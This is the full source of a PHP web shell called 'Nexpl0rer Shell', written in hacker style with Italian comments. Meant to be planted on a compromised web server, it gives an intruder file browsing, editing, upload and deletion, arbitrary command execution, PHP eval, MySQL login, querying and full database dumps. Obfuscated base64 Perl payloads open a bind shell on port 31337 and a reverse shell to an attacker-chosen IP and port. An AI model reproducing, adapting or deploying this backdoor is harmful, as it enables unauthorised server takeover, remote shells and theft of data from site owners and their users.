<?
/*
31337 Shell by Nexen - PhP c0dah
Fuck 2 all (fake) bl4ck h4t h4x00rZ (usual php n00bs)
thx to KiNgOfThEwOrLd 4 IdeA
*/
error_reporting(0);
// Function for table dump
function datadump ($table) {

  # Creo la variabile $result
  $result .= "# Dump of $table \n";
  $result .= "# Dump DATE : " . date("d-M-Y") ."\n\n";

  # Conto i campi presenti nella tabella
  $query = mysql_query("select * from $table");
  $num_fields = @mysql_num_fields($query);

  # Conto il numero di righe presenti nella tabella
  $numrow = mysql_num_rows($query);

  # Passo con un ciclo for tutte le righe della tabella
  for ($i =0; $i<$numrow; $i++)
  {
    $row = mysql_fetch_row($query);

    # Ricreo la tipica sintassi di un comune Dump
    $result .= "INSERT INTO ".$table." VALUES(";

    # Con un secondo ciclo for stampo i valori di tutti i campi
    # trovati in ogni riga
    for($j=0; $j<$num_fields; $j++) {
      $row[$j] = addslashes($row[$j]);
      $row[$j] = ereg_replace("\n","\\n",$row[$j]);
      if (isset($row[$j])) $result .= "\"$row[$j]\"" ; else $result .= "\"\"";
      if ($j<($num_fields-1)) $result .= ",";
    }

    # Chiudo l'istruzione INSERT
    $result .= ");\n";
  }

  return $result . "\n\n\n";
}

// Getting Directory..
if ($_POST['dir'] == "") {	
	if ($_COOKIE['dir'] == "") {
		$dir=realpath(".");
	}
	else
	{
		$dir=$_COOKIE['dir'];
	}
}
else
{
	$dir=$_POST['dir'];
	setcookie("dir",$_POST['dir']);
}

if (strtoupper(substr(PHP_OS, 0, 3)) == 'LIN') {
    (substr($dir,strlen($dir)-1,1) != "/") ? $dir .= "/" : print ""; 
}
// Getting something...
$safemode_off_msg = "<font color=green>Safe Mode: OFF</font><br />";
$safemode_on_msg = "<font color=red>Safe Mode: ON</font><br />";
$gpc_off_msg = "<font color=green>Magic Quotes: OFF</font><br />";
$gpc_on_msg = "<font color=red>Magic Quotes: ON</font><br />";
$auf_on_msg = "<font color=green>Allow URL Fopen: ON</font><br />";
$auf_off_msg = "<font color=red>Allow URL Fopen: OFF</font><br />";
$reglobals_on_msg = "<font color=green>Register Globals: ON</font><br />";
$reglobals_off_msg = stripslashes("<font color=red>Register Globals: OFF</font><br />");
$uname = php_uname()."<br />";
(ini_get("safe_mode") == 0) ? $safemode = $safemode_off_msg : $safemode = $safemode_on_msg;
(ini_get("magic_quotes_gpc") == 0) ? $gpc = $gpc_off_msg : $gpc = $gpc_on_msg;
(ini_get("allow_url_fopen") == 1) ? $auf = $auf_on_msg : $auf = $auf_off_msg;
(ini_get("register_globals") == 1) ? $reglobals = $reglobals_on_msg : $reglobals = $reglobals_off_msg;

$freespace = disk_free_space($dir);
$totalspace = disk_total_space($dir);
$percentfree = ($freespace*100)/$totalspace;
$percentbusy = 100-$percentfree;
$freespace = intval((($freespace/1024)/1024)/1024);
$totalspace = intval((($totalspace/1024)/1024)/1024);
$freespace .= " GB";
$totalspace .= " GB";
$current_user = "Who are you? ".get_current_user()."<br />";
$uid = "Uid: ".getmyuid()." Gid: ".getmygid()."<br />";

 

if ($_POST['mode'] == "ls") {
//Directory listing 
$output .= "<br /><br />Directory listing:<br /><div align=left>";
$opendir = opendir($dir)or print("<font color=red>Can't open directory</font>");
while ($file=readdir($opendir)){
	if ($dir == realpath(".")) {
		if (is_file($file)){
			$perms = fileperms($file);
			$info = (($perms & 0x0100) ? 'r' : '-');
			$info .= (($perms & 0x0080) ? 'w' : '-');
			$info .= (($perms & 0x0800) ? 's' : 'x');

			$output.= "| file |".$info."|".$file." - <a href=\"javascript:document.fedit.modfile.value='".$file."';document.fedit.submit();\">Edit</a> - <a href=\"javascript:document.delfile.delfile.value='".$file."';document.delfile.submit();\">Delete</a><br />";
		}
		else
		{
			$perms = fileperms($file);
			$info = (($perms & 0x0100) ? 'r' : '-');
			$info .= (($perms & 0x0080) ? 'w' : '-');
			$info .= (($perms & 0x0800) ? 's' : 'x' );
			$output .= "| dir |".$info."|".$file." - <a href=\"javascript:document.folder.dir.value='".$dir.$file."';document.folder.submit();\">Go</a><br />";
		}
	}
	else
	{
		if (is_file($dir.$file)){
			$perms = fileperms($file);
			$info = (($perms & 0x0100) ? 'r' : '-');
			$info .= (($perms & 0x0080) ? 'w' : '-');
			$info .= (($perms & 0x0800) ? 's' : 'x' );
			$output.= "| file |".$info."|".$file." - <a href=\"javascript:document.fedit.modfile.value='".$file."';document.fedit.submit();\">Edit</a> - <a href=\"javascript:document.delfile.delfile.value='".$file."';document.delfile.submit();\">Delete</a><br />";
		}
		else
		{
			$perms = fileperms($file);
			$info = (($perms & 0x0100) ? 'r' : '-');
			$info .= (($perms & 0x0080) ? 'w' : '-');
			$info .= (($perms & 0x0800) ? 's' : 'x' );
			$output .= "| dir |".$info."|".$file." - <a href=\"javascript:document.folder.dir.value='".$dir.$file."';document.folder.submit();\">Go</a><br />";
		}
	}
}
$output .= "</div>";
}
//Editing file...
if ($_POST['mode']=="edit") {
($dir==realpath(".")) ? $file=$_POST['modfile'] : $file=$dir.$_POST['modfile'];
$content = file_get_contents($file);
$output .= "<form action=# method=post><input type=hidden name=mode value=doedit><input type=hidden name=modfile value='".$_POST['modfile']."'>
<textarea rows=20 cols=50 name=newtext>".htmlspecialchars($content)."</textarea><br /><input type=submit value=edit></form>";
}
if ($_POST['mode']=="doedit") {
($dir==realpath(".")) ? $file=$_POST['modfile'] : $file=$dir.$_POST['modfile'];
$output .= $file."<br />";
$fh = fopen($file, "w+")or die("<font color=red>Error: cannot open file</font>");
fwrite($fh, stripslashes($_POST['newtext']))or die("<font color=red>Error: cannot write to file</font>");
fclose($fh);
$output .= "Done.";
}
//Making file..
if ($_POST['mode'] == "mkfile") {
($dir==realpath(".")) ? $file=$_POST['mkfile'] : $file=$dir.$_POST['mkfile'];
$output .= "<form action=# method=post><input type=hidden name=mode value=domkfile><input type=hidden name=mkfile value='".$_POST['mkfile']."'>
<textarea rows=20 cols=50 name=text></textarea><br /><input type=submit value=make></form>";
}
if ($_POST['mode'] == "domkfile") {
($dir==realpath(".")) ? $file=$_POST['mkfile'] : $file=$dir.$_POST['mkfile'];
$fh = fopen($file, "w+")or die("<font color=red>Error: cannot create file</font>");
fwrite($fh, stripslashes($_POST['text']))or die("<font color=red>Error: cannot write to file</font>");
fclose($fh);
$output .= "Made.";
}
//Deleting file..
if ($_POST['mode'] == "delfile") {
($dir==realpath(".")) ? $file=$_POST['delfile'] : $file=$dir.$_POST['delfile'];
unlink($file)or die("<font color=red>Error: cannot delete file</font>");
$output .= "File deleted.";
}
// cmd...
if ($_POST['mode'] == "cmd") {
switch ($_POST['func']) {
	case "system":
	system(stripslashes($_POST['cmd']));
	die();
	break;
	case "popen":
	$handle = popen($_POST['cmd'].' 2>&1', 'r');
	echo "'$handle'; " . gettype($handle) . "\n";
	$read = fread($handle, 2096);
	echo $read;
	pclose($handle);
	die();
	break;
	case "shell_exec":
	shell_exec(stripslashes($_POST['cmd']));
	die();
	break;
	case "exec":
	exec(stripslashes($_POST['cmd']));
	die();
	break;
	case "passthru":
	passthru(stripslashes($_POST['cmd']));
	die();
	break;
}
die();
}
// upload
if ($_POST['mode'] == "uploadz") {
$percorso = $_FILES['miofile']['tmp_name'];
$nome = $_FILES['miofile']['name'];
if (move_uploaded_file($percorso, $dir.$nome))
{
$output .= "<br><br>$nome Has Been Saved!";
}
else { $output = "<font color=red>Cannot upload</font>"; }
}
// rename
if ($_POST['mode'] == "renfile") {
rename($dir.$_POST['oldname'], $dir.$_POST['newname'])or die("<font color=red>Cannot rename file</font>");
$output = "File renamed.";
}
// Bind port
if ($_POST['mode'] == "bind") {
$sourz['windows'] = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQojIFBlcmwgQmFja2QwMHIgQmluRCBTaGVsbA0KIyBuMHQgdmVyeSBwcml2OA0KIyBjMGRlZCBieSBOZXhlbiAtMzEzMzcgcGhwIGMwZGFoIA0KIyAtPSBOZXhlbiByMHggPS0NCnVzZSBTb2NrZXQ7ICNwZXIgZ2VzdGlyZSBpIHNvY2tldA0KdXNlIEZpbGVIYW5kbGU7ICMgcGVyIGxcJ2F1dG9mbHVzaA0KJG1heF9jb25uPTEwOw0KJHBvcnRhX2xvY2FsZT0zMTMzNzsNCiRwYWRkcl9sb2NhbGU9cGFja19zb2NrYWRkcl9pbigkcG9ydGFfbG9jYWxlLElOQUREUl9BTlkpOw0Kc29ja2V0KFNFUlYsQUZfSU5FVCxTT0NLX1NUUkVBTSxcJ3RjcFwnKSB8fCBkaWUoXCJFcnJvcmU6ICQhXCIpOyAgI3NlcnZlci1zb2NrZXQNCnNldHNvY2tvcHQoU0VSVixTT0xfU09DS0VULFNPX1JFVVNFQUREUiwxKSB8fCBkaWUoXCJFcnJvcmU6ICQhXCIpOw0KYmluZChTRVJWLCRwYWRkcl9sb2NhbGUpIHx8IGRpZShcIkVycm9yZTogJCFcIik7DQpsaXN0ZW4oU0VSViwkbWF4X2Nvbm4pIHx8IGRpZShcIkVycm9yZTogJCFcIik7DQpteSAkcGFkZHJfc2luZz1hY2NlcHQoU0lORywgU0VSVik7ICNhY2NldHRvIGxhIGNvbm5lc3Npb25lIGRhbCBjbGllbnQNCm15KCRzaW5nX3BvcnRhLCRzaW5nX2FkZHIsJGdldCk9dW5wYWNrX3NvY2thZGRyX2luKCRwYWRkcl9zaW5nKTsNClNJTkctPmF1dG9mbHVzaCgpOw0Kb3BlbihTVERJTiwgXCI+JlNJTkdcIik7DQpvcGVuKFNURE9VVCxcIj4mU0lOR1wiKTsNCm9wZW4oU1RERVJSLFwiPiZTSU5HXCIpOw0KZXhlYyhcJ0M6XFx3aW5kb3dzXFxzeXN0ZW0zMlxcY21kLmV4ZVwnKTsNCmNsb3NlKFNJTkcpOw==");
$sourz['linux'] = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQojIFBlcmwgQmFja2QwMHIgQmluRCBTaGVsbA0KIyBuMHQgdmVyeSBwcml2OA0KIyBjMGRlZCBieSBOZXhlbiAtMzEzMzcgcGhwIGMwZGFoIA0KIyAtPSBOZXhlbiByMHggPS0NCnVzZSBTb2NrZXQ7ICNwZXIgZ2VzdGlyZSBpIHNvY2tldA0KdXNlIEZpbGVIYW5kbGU7ICMgcGVyIGxcJ2F1dG9mbHVzaA0KJG1heF9jb25uPTEwOw0KJHBvcnRhX2xvY2FsZT0zMTMzNzsNCiRwYWRkcl9sb2NhbGU9cGFja19zb2NrYWRkcl9pbigkcG9ydGFfbG9jYWxlLElOQUREUl9BTlkpOw0Kc29ja2V0KFNFUlYsQUZfSU5FVCxTT0NLX1NUUkVBTSxcJ3RjcFwnKSB8fCBkaWUoXCJFcnJvcmU6ICQhXCIpOyAgI3NlcnZlci1zb2NrZXQNCnNldHNvY2tvcHQoU0VSVixTT0xfU09DS0VULFNPX1JFVVNFQUREUiwxKSB8fCBkaWUoXCJFcnJvcmU6ICQhXCIpOw0KYmluZChTRVJWLCRwYWRkcl9sb2NhbGUpIHx8IGRpZShcIkVycm9yZTogJCFcIik7DQpsaXN0ZW4oU0VSViwkbWF4X2Nvbm4pIHx8IGRpZShcIkVycm9yZTogJCFcIik7DQpteSAkcGFkZHJfc2luZz1hY2NlcHQoU0lORywgU0VSVik7ICNhY2NldHRvIGxhIGNvbm5lc3Npb25lIGRhbCBjbGllbnQNCm15KCRzaW5nX3BvcnRhLCRzaW5nX2FkZHIsJGdldCk9dW5wYWNrX3NvY2thZGRyX2luKCRwYWRkcl9zaW5nKTsNClNJTkctPmF1dG9mbHVzaCgpOw0Kb3BlbihTVERJTiwgXCI+JlNJTkdcIik7DQpvcGVuKFNURE9VVCxcIj4mU0lOR1wiKTsNCm9wZW4oU1RERVJSLFwiPiZTSU5HXCIpOw0KZXhlYyhcJy9iaW4vc2hcJyk7DQpjbG9zZShTSU5HKTs=");
(strtoupper(substr(PHP_OS,0,3)) == "WIN") ? $source = $sourz['windows'] : $source = $sourz['linux'];
$fh = fopen("bind.pl", "w+")or die("error.");
fwrite($fh, $source)or die("error.");
fclose($fh);
passthru("perl bind.pl");
unlink("bind.pl");
}
// Reverse c0nn
if ($_POST['mode'] == "reverse") {
$source['linux'] = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGhvc3QgPSAkQVJHVlswXTsNCiRwb3J0ID0gJEFSR1ZbMV07DQoNCiAgICBpZiAoISRBUkdWWzBdKSB7DQogIHByaW50ZiAiWyFdIFVzYWdlOiBwZXJsIGRjMi5wbCA8SG9zdD4gPFBvcnQ+XG4iOw0KICBleGl0KDEpOw0KfQ0KcHJpbnQgIlsrXSBDb25uZWN0aW5nIHRvICRob3N0XG4iOw0KJHByb3QgPSBnZXRwcm90b2J5bmFtZSgndGNwJyk7ICMgdSBjYW4gY2hhbmdlIHRoaXMNCnNvY2tldChTRVJWRVIsIFBGX0lORVQsIFNPQ0tfU1RSRUFNLCAkcHJvdCkgfHwgZGllICgiWy1dIFVuYWJsZSB0byBDb25uZWN0ICEiKTsNCmlmICghY29ubmVjdChTRVJWRVIsIHBhY2sgIlNuQTR4OCIsIDIsICRwb3J0LCBpbmV0X2F0b24oJGhvc3QpKSkge2RpZSgiWy1dIFVuYWJsZSB0byBDb25uZWN0ICEiKTt9DQogIG9wZW4oU1RESU4sIj4mU0VSVkVSIik7DQogIG9wZW4oU1RET1VULCI+JlNFUlZFUiIpOw0KICBvcGVuKFNUREVSUiwiPiZTRVJWRVIiKTsNCnByaW50ICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cbiI7DQpwcmludCAiPSAgICAgIENvbm5lY3RNZSAoQmFjayBCYWNrZG9vcikgICAgICA9XG4iOw0KcHJpbnQgIj0gICAgIElSQU4gSEFDS0VSWiBTRUNVUklUWSBURUFNICAgICAgPVxuIjsNCnByaW50ICI9ICAgICAgICAgIGNvZGVkIGJ5IEhlc3NhbS14ICAgICAgICAgID1cbiI7DQpwcmludCAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG4iOw0KICBleGVjIHsnL2Jpbi9zaCd9ICctYmFzaCcgLiAiXDAiIHggNDsg");
$source['windows'] = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGhvc3QgPSAkQVJHVlswXTsNCiRwb3J0ID0gJEFSR1ZbMV07DQoNCiAgICBpZiAoISRBUkdWWzBdKSB7DQogIHByaW50ZiAiWyFdIFVzYWdlOiBwZXJsIGRjMi5wbCA8SG9zdD4gPFBvcnQ+XG4iOw0KICBleGl0KDEpOw0KfQ0KcHJpbnQgIlsrXSBDb25uZWN0aW5nIHRvICRob3N0XG4iOw0KJHByb3QgPSBnZXRwcm90b2J5bmFtZSgndGNwJyk7ICMgdSBjYW4gY2hhbmdlIHRoaXMNCnNvY2tldChTRVJWRVIsIFBGX0lORVQsIFNPQ0tfU1RSRUFNLCAkcHJvdCkgfHwgZGllICgiWy1dIFVuYWJsZSB0byBDb25uZWN0ICEiKTsNCmlmICghY29ubmVjdChTRVJWRVIsIHBhY2sgIlNuQTR4OCIsIDIsICRwb3J0LCBpbmV0X2F0b24oJGhvc3QpKSkge2RpZSgiWy1dIFVuYWJsZSB0byBDb25uZWN0ICEiKTt9DQogIG9wZW4oU1RESU4sIj4mU0VSVkVSIik7DQogIG9wZW4oU1RET1VULCI+JlNFUlZFUiIpOw0KICBvcGVuKFNUREVSUiwiPiZTRVJWRVIiKTsNCnByaW50ICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cbiI7DQpwcmludCAiPSAgICAgIENvbm5lY3RNZSAoQmFjayBCYWNrZG9vcikgICAgICA9XG4iOw0KcHJpbnQgIj0gICAgIElSQU4gSEFDS0VSWiBTRUNVUklUWSBURUFNICAgICAgPVxuIjsNCnByaW50ICI9ICAgICAgICAgIGNvZGVkIGJ5IEhlc3NhbS14ICAgICAgICAgID1cbiI7DQpwcmludCAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG4iOw0KICBleGVjKCdDOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUnKTs=");
(strtoupper(substr(PHP_OS,0,3)) == "WIN") ? $sourz = $source['windows'] : $sourz = $source['linux'];
$fh = fopen("reverse.pl", "w+")or die("error.");
fwrite($fh, $sourz)or die("error.");
fclose($fh);
$output = passthru("perl reverse.pl ".$_POST['ip']." ".$_POST['port']);
unlink("reverse.pl");
}
// MySQL Login
if ($_POST['mode'] == "loginsql") {
setcookie("mysql_user", $_POST['user']);
setcookie("mysql_pass",$_POST['pass']);
setcookie("mysql_host",$_POST['host']);
$link = mysql_connect($_POST['host'], $_POST['user'], $_POST['pass'])or die(mysql_error());
$output = "<form action=# method=post><input type=hidden name=mode value=sql_query>
<input type=text name=dbname value='database name'><br><br><input type=text name='query' value='sql quey'><br><br><input type='submit' value='Esegui Query'></form><br /><br />";
$output .= "<form action=# method=post><input type=hidden name=mode value=dump_db><input type=text name=dbname><input type=submit value=DumpDb></form>";
}
// MySQL Query
if ($_POST['mode'] == "sql_query") {
$link = mysql_connect($_COOKIE['mysql_host'], $_COOKIE['mysql_user'], $_COOKIE['mysql_pass'])or die(mysql_error());
(isset($_POST['dbname'])) ? mysql_select_db($_POST['dbname']) : print "";
$query = mysql_query(stripslashes($_POST['query']))or die(mysql_error());
while ($risultato = mysql_fetch_array($query))
{
foreach ($risultato as $par => $val) { 
(is_numeric($par)) ? $output .= "" : $output .= $par." => ".$val."<br />";
}
}
$output .= "<form action=# method=post><input type=hidden name=mode value=sql_query>
<input type=text name=dbname value='database name'><br><br><input type=text name='query' value='sql query'><br><br><input type='submit' value='Esegui Query'></form></center>";
}
// MySQL Dump
if ($_POST['mode'] == "dump_db") {
$dump = "# Dumped with Nexpl0rerSh \n";
$db = $_POST['dbname'];
$link = mysql_connect($_COOKIE['mysql_host'], $_COOKIE['mysql_user'], $_COOKIE['mysql_pass'])or die(mysql_error());
(isset($_POST['dbname'])) ? mysql_select_db($_POST['dbname']) : print "";
$q = mysql_query("SHOW TABLES")or die(mysql_error());
while ($table = mysql_fetch_array($q)) {
$dump .= datadump($table[0]);
}
$file_name = $db.".sql";
Header("Content-type: application/octet-stream"); 
Header("Content-Disposition: attachment; filename = $file_name");
echo $dump; 
die();
}
// MkDir
if ($_POST['mode'] == "mkdir") {
chdir($dir)or die("Error.");
if (mkdir($_POST['mkdir'])) {
$output = "Directory created.";
}
}
// Eval
if ($_POST['mode'] == "eval") {
eval(stripslashes($_POST['eval']));
die();
}
if ($_POST['mode']=="phpinfo") {
phpinfo();
die();
}
?>
<title><?="[nexpl0rer@".getenv("HTTP_HOST")." ~]"?></title>

<style type="text/css">
<!--
.Stile1 {
	color: #000000;
	font-size: 24px;
	font-weight: bold;
	font-family: Geneva, Arial, Helvetica, sans-serif;
}
-->
</style>
<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
  <tr height="30%">
    <td height="19"><table bgcolor="#CCCCCC" width="100%" height="149" border="0" cellpadding="0" cellspacing="0">
      <tr>
        <td><div align="center" class="Stile1">Nexpl0rer Shell | PHP R0X | MADE BY NEXEN </div></td>
      </tr>
    </table>
    </td>
  </tr>
  <tr height="70%">
    <td><table bgcolor="#CCCCCC" width="100%" height="526" border="0" cellpadding="0" cellspacing="0">
      <tr>
        <td width="24%"><form name=fedit action=# method=post><input type=hidden name=mode value=edit>
           File t0 edit?
           <input type=text name=modfile size="12"><input type=submit value=edit></form><form action=# method=post><input type=hidden name=mode value=mkfile>
           File t0 make
             <input type=text name='mkfile' size="12"><input type=submit value=make></form>
			 <form action=# name='delfile' method=post><input type=hidden name=mode value=delfile>
           <span class="Stile2">File t0 delete</span>:
             <input type=text name='delfile' size="12"><input type=submit value=unlink></form><form method="post" action="#" enctype="multipart/form-data"><input type="hidden" name="mode" value="uploadz" />
             file t0 upl0ad:
           <input type="file" value="Load..." name="miofile" />
<input type="submit" name="ok" value="Do Upload" /></form><form action=# method=post><input type="hidden" name="mode" value="renfile" />Rename file:<input type="text" name="oldname" value="0ld name" size="12" /><input type="text" name="newname" value="New name" size="12" /><input type="submit" value="rename" /></form><form action="#" method="post"><input type="hidden" name="mode" value="mkdir" />Make Dir: <input type="text" name="mkdir" /><input type="submit" value="make" /></form> </td>
        <td width="51%" style="border:#000000 solid 1px;" align="center"><form action="#" method="post"><input type="hidden" name="mode" value="phpinfo" /><input type="submit" value="[PHPInfo]" /></form><?=$uname?>
     Free space: <?=$freespace?> || Total space: <?=$totalspace?> (<?=$percentbusy?>% busy)<br />
       <?=$current_user?><?=$uid?>
   ||<?=$safemode?> || <?=$gpc?> || <?=$auf?> || <?=$reglobals?>
   <br>
   <br>
   <form action=# method=post name="folder" id="folder">
     <input type=hidden name='mode' value='ls'>
            folder:
             <input type=text value='<?=$dir?>' name='dir'><input type=submit value=change/list>
         </form><?=$output?><br>
   <br></td>
        <td width="25%"><form action=# method=post><input type=hidden name=mode value=cmd>
		 <span class="Stile2">Cmd:</span><input tpye=text name=cmd><select name="func">
		   <option selected="selected">system</option>
		   <option>passthru</option>
		   <option>exec</option>
		   <option>shell_exec</option>
		   <option>popen</option>
		 </select><input type=submit value=exec></form><form action="#" method="post"><input type=hidden name=mode value=reverse />BackConn: <input name="ip" type="text" value="ip.." size="12" /><input name="port" type="text" value="port..." size="2" />
	   <input type="submit" value="reverse" /></form><form action=# method="post"><input type="hidden" name="mode" value="bind" />
	   Binding port...
	       <input type=submit value="Bind port 31337" /></form><form action="#" method="post"><input type=hidden name=mode value=loginsql />
	         Mysql:
	         <input name="user" type="text" value="user" size="12" />
	   <input type="text" size="12" name="pass" value="pass" /><input type="text" name="host" size="12" value="host" /><input type="submit" value="connect" /></form><form method="post" action="#"><input type="hidden" value="eval" name="mode" />PHP Code: <input type="text" name="eval" /><input type="submit" value="Eval" /></form></td>
      </tr>
    </table></td>
  </tr>
</table>

